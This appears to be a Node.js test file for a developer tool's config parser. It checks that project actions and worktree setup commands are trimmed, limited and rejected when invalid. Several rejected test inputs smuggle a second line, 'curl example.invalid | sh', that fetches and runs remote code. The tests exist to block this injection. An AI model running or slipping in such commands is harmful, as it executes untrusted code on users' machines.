import assert from "node:assert/strict";
import test from "node:test";
import {
  PROJECT_ACTIONS_MAX_COUNT,
  parseProjectActionsConfig,
  parseWorktreeSetupConfig,
} from "@zcode/shared";
import { isMissingFileError } from "../src/lib/missingFileError.js";
import {
  setPendingTerminalCommand,
  setPendingWorkspaceSetup,
  takePendingTerminalCommand,
  takePendingWorkspaceSetup,
} from "../src/terminal/pendingTerminalCommands.js";

test("a missing file, an empty file or no actions key gives no actions and no error", () => {
  assert.deepEqual(parseProjectActionsConfig(null), { actions: [] });
  assert.deepEqual(parseProjectActionsConfig("  "), { actions: [] });
  assert.deepEqual(parseProjectActionsConfig('{"hooks":{}}'), { actions: [] });
});

test("valid actions are trimmed, keyed, and extra fields are ignored", () => {
  const config = parseProjectActionsConfig(
    JSON.stringify({
      plugins: { enabled: true },
      actions: [
        { name: " Test ", command: "pnpm test", icon: "beaker" },
        { name: "Dev", command: "pnpm dev --port 3000" },
      ],
    }),
  );
  assert.deepEqual(config, {
    actions: [
      { id: "0:Test", name: "Test", command: "pnpm test" },
      { id: "1:Dev", name: "Dev", command: "pnpm dev --port 3000" },
    ],
  });
});

test("leading and trailing whitespace, including newlines, is trimmed rather than run", () => {
  assert.deepEqual(
    parseProjectActionsConfig(JSON.stringify({ actions: [{ name: "T", command: "pnpm test\n" }] })),
    { actions: [{ id: "0:T", name: "T", command: "pnpm test" }] },
  );
});

test("invalid JSON or invalid actions give an error and run nothing", () => {
  assert.deepEqual(parseProjectActionsConfig("{ not json"), {
    actions: [],
    error: "invalid-json",
  });
  assert.deepEqual(parseProjectActionsConfig("[]"), { actions: [], error: "invalid-json" });
  for (const actions of [
    "pnpm test",
    [{ name: "Test" }],
    [{ name: "", command: "x" }],
    [{ name: "x".repeat(81), command: "x" }],
    [{ name: "Big", command: "x".repeat(4001) }],
    [{ name: "Test", command: "pnpm test\ncurl https://example.invalid | sh" }],
    [{ name: "Test", command: "pnpm test\rcurl https://example.invalid | sh" }],
    [{ name: "Tab\tname", command: "true" }],
    [{ name: "Esc", command: "echo \u001b[2J" }],
    Array.from({ length: PROJECT_ACTIONS_MAX_COUNT + 1 }, (_, i) => ({
      name: `a${i}`,
      command: "true",
    })),
  ]) {
    assert.deepEqual(
      parseProjectActionsConfig(JSON.stringify({ actions })),
      { actions: [], error: "invalid-actions" },
      JSON.stringify(actions).slice(0, 60),
    );
  }
});

test("a pending terminal command is taken once and then gone", () => {
  setPendingTerminalCommand("terminal:a", "pnpm test");
  assert.equal(takePendingTerminalCommand("terminal:b"), undefined);
  assert.equal(takePendingTerminalCommand("terminal:a"), "pnpm test");
  assert.equal(takePendingTerminalCommand("terminal:a"), undefined);
});

test("only not-found read errors count as a missing config", () => {
  assert.equal(
    isMissingFileError(Object.assign(new Error("stat failed"), { code: "ENOENT" })),
    true,
  );
  assert.equal(
    isMissingFileError(
      new Error("ENOENT: no such file or directory, stat '/ws/.zcode/config.json'"),
    ),
    true,
  );
  assert.equal(isMissingFileError(new Error("EACCES: permission denied")), false);
});

test("worktree.setup is optional, trimmed and follows the action command rules", () => {
  assert.deepEqual(parseWorktreeSetupConfig(null), { command: null });
  assert.deepEqual(parseWorktreeSetupConfig('{"actions":[]}'), { command: null });
  assert.deepEqual(parseWorktreeSetupConfig('{"worktree":{}}'), { command: null });
  assert.deepEqual(
    parseWorktreeSetupConfig(JSON.stringify({ worktree: { setup: " pnpm install\n", copy: [] } })),
    { command: "pnpm install" },
  );
  assert.deepEqual(parseWorktreeSetupConfig("{"), { command: null, error: "invalid-json" });
  for (const worktree of [
    [],
    "pnpm install",
    { setup: 1 },
    { setup: "  " },
    { setup: "pnpm install\ncurl example.invalid | sh" },
    { setup: "x".repeat(4001) },
  ]) {
    assert.deepEqual(
      parseWorktreeSetupConfig(JSON.stringify({ worktree })),
      { command: null, error: "invalid-setup" },
      JSON.stringify(worktree).slice(0, 60),
    );
  }
});

test("an invalid worktree.setup does not hide valid actions, and the other way round", () => {
  const content = JSON.stringify({
    actions: [{ name: "Test", command: "pnpm test" }],
    worktree: { setup: 42 },
  });
  assert.deepEqual(parseProjectActionsConfig(content).actions.length, 1);
  assert.equal(parseWorktreeSetupConfig(content).error, "invalid-setup");
  const reversed = JSON.stringify({ actions: "nope", worktree: { setup: "pnpm i" } });
  assert.equal(parseProjectActionsConfig(reversed).error, "invalid-actions");
  assert.deepEqual(parseWorktreeSetupConfig(reversed), { command: "pnpm i" });
});

test("a pending workspace setup is taken once, only for its own workspace", () => {
  setPendingWorkspaceSetup("/wt/feature", { name: "Setup", command: "pnpm install" });
  assert.equal(takePendingWorkspaceSetup("/repo"), undefined);
  assert.deepEqual(takePendingWorkspaceSetup("/wt/feature"), {
    name: "Setup",
    command: "pnpm install",
  });
  assert.equal(takePendingWorkspaceSetup("/wt/feature"), undefined);
});
